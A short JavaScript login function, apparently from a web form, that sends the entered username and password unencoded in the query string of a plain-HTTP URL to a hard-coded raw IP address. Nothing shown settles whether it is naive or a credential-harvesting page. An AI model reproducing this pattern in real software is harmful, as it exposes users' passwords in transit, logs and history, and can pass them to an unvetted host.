function login() {
    var username = document.getElementById("inputUsername").value;
    var password = document.getElementById("inputPassword").value;

    var url = "http://46.101.53.127/login?username=" + username + "&password=" + password;

    window.location.replace(url);
}